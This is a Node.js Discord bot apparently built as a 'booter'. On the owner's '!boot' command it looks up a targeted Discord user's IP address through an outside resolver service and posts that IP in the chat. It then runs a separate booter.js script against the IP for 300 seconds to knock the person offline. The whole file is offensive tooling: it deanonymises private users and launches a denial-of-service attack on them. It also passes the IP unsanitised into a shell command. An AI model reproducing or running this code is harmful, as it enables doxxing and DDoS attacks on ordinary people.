const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages],
  partials: ['MESSAGE', 'CHANNEL']
});
const axios = require('axios');
const { exec } = require('child_process');

const OWNER_ID = "1265916874311471125";  // ← your Discord ID only

client.once('ready', () => console.log(`Booter online → ${client.user.tag}`));

client.on('messageCreate', async message => {
  if (message.author.id !== OWNER_ID) return;
  if (!message.content.startsWith('!boot')) return;

  const target = message.mentions.users.first() || client.users.cache.get(message.content.split(' ')[1]);
  if (!target) return message.reply('`!boot @user` or `!boot <id>`');

  message.reply(`**LOCKING ON ${target.tag}...** 🔍`);

  const ip = await (async () => {
    try {
      const res = await axios.get(`https://hikari.resolver.lol/resolve/${target.id}`, { timeout: 8000 });
      return res.data.ip || null;
    } catch {
      return null;
    }
  })();

  if (!ip || ip === '0.0.0.0') return message.reply('**IP PROTECTED** (VPN / Discord privacy)');

  message.reply(`**IP:** ||${ip}||\n**SENDING OFFLINE...** ⚡`);

  exec(`node booter.js "${ip}" 300`, () => {
    message.reply(`**${target.tag} IS NOW OFFLINE** 🔥\n||${ip}||`);
  });
});

client.login(process.env.TOKEN);
